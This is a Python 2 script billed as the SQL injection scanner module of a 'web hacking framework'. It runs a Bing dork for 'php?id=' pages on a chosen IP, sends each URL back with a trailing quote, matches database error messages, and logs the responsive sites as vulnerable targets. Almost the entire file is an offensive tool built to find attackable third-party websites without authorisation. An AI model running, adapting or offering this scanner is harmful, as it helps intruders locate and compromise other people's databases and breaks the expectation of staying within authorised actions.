import urllib
import os
import re
from time import sleep
def sqlihunt(dork , filename ):

  # extract Urls from a Bing search engin querying the given dork and test every url in 
  # the result is stored in a text file
  dork= 'IP:'+dork+" php?id= "
  file2 =open(filename+'.txt','w')
  start=0
  end=200
  sleep(3)
  print "[info]Getting Websites From Bing ... "
  while start<=end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
      #return find 
    except IOError:
      print "[ERROR]network error "
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :
      for i in range(len(find)):
                  rez=find[i]+"'"
                  tst = urllib.urlretrieve(rez)
                  tstf = open(tst[0])
                  tstdd= tstf.read()
                  tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                  if(tstfind):
                    print "[SLQi] : "+ rez 
                    file2.write(rez + '\n')
                  else:
                    print "[No SQLi ] : " + rez
    except IOError:
      print "[ERROR]No result found"
##########################################################################################################################

print  """
      |=======================================================|
      |====================  [ 404 ]   =======================|
      |=============[ lordnotfound404@gmail.com ]=============|
      |========[ https://www.facebook.com/404andreas]=========|
      |=======================================================|
      | ****      Web Hacking framwork by 404      ***        |
      |               SQL Server scanner modul                |
      |=======================================================|
    """
param1 = raw_input("IP : ")
param2 = raw_input("Filename :  ")
sqlihunt(param1 , param2 )
print " ./done "
